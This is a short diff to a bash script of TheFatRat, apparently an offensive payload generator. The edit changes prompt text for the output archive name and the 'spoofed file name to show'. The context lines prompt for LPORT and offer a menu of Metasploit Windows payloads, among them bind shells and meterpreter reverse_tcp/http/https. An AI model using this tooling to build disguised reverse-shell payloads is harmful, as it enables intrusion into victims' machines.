@@ -752,10 +752,10 @@ echo ""
   					echo -ne $okegreen " SET LPORT : ";tput sgr0
   					read yourport
   					echo ""
-  					echo -ne $okegreen " Please enter the base name for output files(zip/rar):" ;tput sgr0
+  					echo -ne $okegreen " Please enter the base name for output files ex: test.zip / test.rar):" ;tput sgr0
   					read fira
             				echo ""
-            				echo -ne $okegreen " Please enter spoofed file name to show :" ;tput sgr0
+            				echo -ne $okegreen " Please enter spoofed file name to show ex : stuff.txt :" ;tput sgr0
             				read fira2
   					echo ""
   					payloads=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
